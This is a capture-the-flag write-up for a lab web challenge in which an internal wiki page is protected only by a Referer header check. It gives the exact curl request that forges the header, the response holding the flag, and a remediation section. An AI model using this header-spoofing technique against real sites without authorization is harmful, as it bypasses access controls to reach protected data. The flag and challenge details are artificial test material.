# Harbor_Wiki - Referer-trusted internal page

| | |
|---|---|
| **Challenge** | Harbor_Wiki |
| **Category** | AUTH |
| **Points / Difficulty** | 100 / easy |
| **Target** | http://auth2.chal.deti:8061 |
| **Auth weakness** | CWE-293 - using the `Referer` header for authentication |

## Hint
> Who sent you this way? The page only asks, and trusts whatever you say.

## Recon
"Team knowledge base" (Flask/gunicorn). The wiki links an **Internal** ops
runbook at `/wiki/internal/ops-runbook`. Requesting it directly is rejected - the app gates the page on whether you arrived from the internal
`/wiki/staff-home` page, and it checks that by reading the `Referer` header.

## Approach
The hint ("who sent you this way… trusts whatever you say") points straight at
CWE-293: the only access control is a `Referer` check, and `Referer` is a
request header the client sets, so it can be forged. Set `Referer` to the
authorized internal page and the server serves the protected content.

## Exploitation - the exact request
```bash
curl -s http://auth2.chal.deti:8061/wiki/internal/ops-runbook \
     -H 'Referer: http://auth2.chal.deti:8061/wiki/staff-home'
```

## Response fragment that carried the flag
```html
<tr><th>Break-glass admin token</th><td>flag{df539f06bf2d270854f2bc61f323bbc1}</td></tr>
```

## Flag
```
flag{df539f06bf2d270854f2bc61f323bbc1}
```

## Root cause & remediation
- **Cause:** access control relies on the `Referer` header, which is
  client-controlled and trivially spoofed (CWE-293). It proves nothing about
  the user's identity or prior navigation.
- **Fix:** gate internal pages on a real server-side session / authenticated
  role, not on `Referer` (or any request header the client sets). Treat
  `Referer`/`Origin` as hints at most, never as authentication.
